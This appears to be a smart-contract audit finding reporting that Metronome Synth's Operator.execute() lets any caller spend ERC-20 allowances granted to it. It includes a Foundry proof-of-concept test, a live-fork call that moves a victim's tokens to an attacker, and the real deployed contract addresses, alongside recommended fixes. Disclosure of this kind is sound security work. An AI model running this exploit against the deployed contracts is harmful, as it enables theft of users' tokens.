### Title
Any ERC-20 tokens approved to `Operator` can be stolen by an unprivileged caller through arbitrary `execute()` calls - ([File: contracts/Operator.sol](https://github.com/Lauraivanka/metronome-synth-public--014/blob/main/contracts/Operator.sol))

### Summary
`Operator.execute()` permits any caller to execute arbitrary calls against arbitrary target contracts while the call’s `msg.sender` is the `Operator` contract. Because ordinary ERC-20 tokens do not implement `SynthContext`, a call to `transferFrom(victim, attacker, amount)` consumes `victim`'s allowance to `Operator`, not an allowance to the attacker. Consequently, any ERC-20 allowance granted to a deployed `Operator` contract can be spent by anyone.

### Finding Description
`Operator.execute()` accepts attacker-controlled `(target, value, callData)` tuples and invokes them using `target.functionCallWithValue(...)`. [1](#0-0) 

When the target is an ordinary ERC-20 contract, its `transferFrom()` uses the immediate caller, `msg.sender`, as the spender. [2](#0-1) 

Thus, if a user has ever called `ERC20.approve(operator, amount)`, an attacker can encode `transferFrom(user, attacker, amount)` inside an `Operator.Call` and have `Operator` consume that approval.

Metronome’s `SynthContext` protects only contracts that explicitly resolve the original caller through `poolRegistry.operator()` and `getActualMsgSender()`. [3](#0-2) 

That protection does not apply to external ERC-20 collateral, reward tokens, WETH wrappers, or any third-party token callable through `execute()`. Those contracts see `Operator` itself as the authorized spender.

### Impact Explanation
This enables direct theft of any token balance covered by an ERC-20 allowance to `Operator`.

The attacker does not need to compromise governance, operators, oracles, bridge endpoints, or privileged protocol roles. The only precondition is an existing nonzero allowance from a victim to the deployed `Operator` contract.

`Operator` is deployed on multiple chains, including Base at `0x64b5bb3b7eF0267019fee5b826c60Cb9B7609373`, Optimism at `0x49219d2feCA183b26F058388e36bbfb139Bf08EC`, and mainnet at `0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360`. [4](#0-3) [5](#0-4) [6](#0-5) 

### Likelihood Explanation
Likelihood depends on whether users or integrations have granted ERC-20 allowances to `Operator`. Any such approval is globally exploitable because `execute()` is permissionless and places no restriction on target contracts or calldata. [1](#0-0) 

The transient sender context does not mitigate this path because external ERC-20 contracts do not query `getActualMsgSender()`. `SynthContext` only changes sender resolution for Metronome contracts that inherit it. [3](#0-2) 

### Recommendation
Do not allow arbitrary external calls with unrestricted target/calldata through `Operator`.

Recommended mitigations:

1. Maintain an allowlist of callable Metronome targets and permitted function selectors.
2. Explicitly reject calls to ERC-20 `transferFrom`, `permit`, `increaseAllowance`, and similarly dangerous selectors unless the target is a vetted protocol contract that uses `SynthContext`.
3. Document that users and integrations must never approve `Operator` directly; it should hold no token allowances.
4. Add fork tests asserting that an allowance from victim to `Operator` cannot be spent by another account.

### Proof of Concept
The following Foundry-style test demonstrates the issue using a local `ERC20Mock` and the production `Operator` implementation.

```solidity
// test/foundry/OperatorApprovalTheft.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../contracts/Operator.sol";
import "../contracts/interfaces/IOperator.sol";
import "../contracts/mock/ERC20Mock.sol";

contract OperatorApprovalTheftTest is Test {
    Operator internal operator;
    ERC20Mock internal token;

    address internal victim = address(0xA11CE);
    address internal attacker = address(0xBAD);

    function setUp() public {
        operator = new Operator();
        token = new ERC20Mock("Collateral", "COL", 18);

        token.mint(victim, 1_000e18);

        vm.prank(victim);
        token.approve(address(operator), 500e18);
    }

    function test_AttackerSpendsVictimApprovalToOperator() public {
        IOperator.Call[] memory calls = new IOperator.Call[](1);

        calls[0] = IOperator.Call({
            target: address(token),
            value: 0,
            callData: abi.encodeCall(
                IERC20.transferFrom,
                (victim, attacker, 500e18)
            )
        });

        vm.prank(attacker);
        operator.execute(calls);

        assertEq(token.balanceOf(attacker), 500e18);
        assertEq(token.balanceOf(victim), 500e18);
        assertEq(token.allowance(victim, address(operator)), 0);
    }
}
```

On a live fork, the same call can be made directly:

```solidity
IOperator.Call[] memory calls = new IOperator.Call[](1);
calls[0] = IOperator.Call({
    target: TOKEN,
    value: 0,
    callData: abi.encodeWithSelector(
        IERC20.transferFrom.selector,
        victim,
        attacker,
        amount
    )
});

IOperator(operator).execute(calls);
```

This succeeds whenever `IERC20(TOKEN).allowance(victim, operator) >= amount`, regardless of whether the attacker has any allowance.

### Citations

**File:** contracts/Operator.sol (L34-49)
```text
    function execute(
        Call[] calldata calls_
    ) external payable override nonReentrant setMsgSender returns (bytes[] memory _returnData) {
        uint256 _length = calls_.length;
        _returnData = new bytes[](_length);

        uint256 _sumOfValues;
        Call calldata _call;
        for (uint256 i; i < _length; ) {
            _call = calls_[i];
            uint256 _value = _call.value;
            unchecked {
                _sumOfValues += _value;
            }
            _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
            unchecked {
```

**File:** contracts/dependencies/openzeppelin/token/ERC20/ERC20.sol (L159-163)
```text
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
```

**File:** contracts/utils/SynthContext.sol (L14-23)
```text
    function _msgSender() internal view virtual override returns (address) {
        IPoolRegistry _poolRegistry = poolRegistry();
        if (address(_poolRegistry) != address(0)) {
            IOperator _operator = _poolRegistry.operator();
            if (msg.sender == address(_operator)) {
                return _operator.getActualMsgSender();
            }
        }

        return msg.sender;
```

**File:** deployments/base/Operator.json (L59-63)
```json
  "transactionHash": "0xdd57a1b6d098a6bfb93626ad244720f0c1d86cf030f423237bc50b70f10915cb",
  "receipt": {
    "to": null,
    "from": "0xF5F5195cF6998c57C651f9f0bBFA7cFC72a6FaC1",
    "contractAddress": "0x64b5bb3b7eF0267019fee5b826c60Cb9B7609373",
```

**File:** deployments/optimism/Operator.json (L59-63)
```json
  "transactionHash": "0x71896a4c95f7ccc97d4f179740f21462cfe5811118fef383699eaa6d3fb2aca5",
  "receipt": {
    "to": null,
    "from": "0xF5F5195cF6998c57C651f9f0bBFA7cFC72a6FaC1",
    "contractAddress": "0x49219d2feCA183b26F058388e36bbfb139Bf08EC",
```

**File:** deployments/mainnet/Operator.json (L59-63)
```json
  "transactionHash": "0x82d0bfe9d71f7f725de079414b4ae5a4e87e46d6fde253b2c89ab315343db741",
  "receipt": {
    "to": null,
    "from": "0xF5F5195cF6998c57C651f9f0bBFA7cFC72a6FaC1",
    "contractAddress": "0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360",
```
